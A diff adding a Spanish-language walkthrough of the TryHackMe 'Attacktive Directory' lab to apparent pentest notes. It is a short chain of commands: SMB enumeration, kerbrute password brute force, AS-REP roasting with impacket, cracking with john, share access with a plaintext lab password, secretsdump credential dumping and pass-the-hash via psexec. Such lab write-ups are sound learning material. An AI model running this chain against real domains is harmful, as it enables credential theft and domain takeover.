@@ -313,3 +313,67 @@ Ahora fuerza bruta de contraseñas.
 ```
 ./kerbrute_linux_amd64 bruteuser -d cicada.htb --dc 10.10.11.35 pass.txt emily.oscars
 ```
+
+## Attacktive directory (THM)
+
+Información de qué nos estamos enfrentando.
+
+```
+crackmapexec smb IP
+```
+
+```
+enum4linux -a 10.10.161.237
+```
+
+Usamos kerbrute.
+
+{% @github-files/github-code-block url="https://github.com/TarlogicSecurity/kerbrute" %}
+
+```
+python3 kerbrute.py -users userlist.txt -passwords passwordlist.txt -domain spookysec.local -t 100
+```
+
+Hemos encontrado un ususario. Pedimos al Domain Controller el Ticket.
+
+```
+impacket-GetNPUsers spookysec.local/svc-admin -no-pass
+```
+
+Crackeamos el hash.
+
+```
+john --wordlist=/rockyou.txt hash
+```
+
+Comprobamos que ese usuario tiene esa contraseña.
+
+```
+crackmapexec smb IP -u 'svc-admin' -p 'Contraseña'
+```
+
+Teniendo estas credenciales, miramos recursos compartidos.
+
+```
+smbclient -L spooky.local --user 'svc-admin' --password 'contraseña'
+```
+
+Entramos dentro de los recursos compartidos.
+
+```
+smbclient \\\\spooky.local\\backup --user svc-admin --password management2005
+```
+
+Descargamos el archivo y decodificamos contraseña. Podemos dumpear la contraseña con **impacket**.
+
+```
+impacket-secretsdump -just-dc backup@spookysec.local
+```
+
+Con su contraseña podemos dumpear y vemos bastantes credenciales.
+
+Ahora lanzamos un ataque **Pass-The-Hash** pasándole el hash de admin ya podemos ejecución remota de comandos.
+
+```
+impacket-psexec Administrator:@spookysec.local -hashes hash
+```
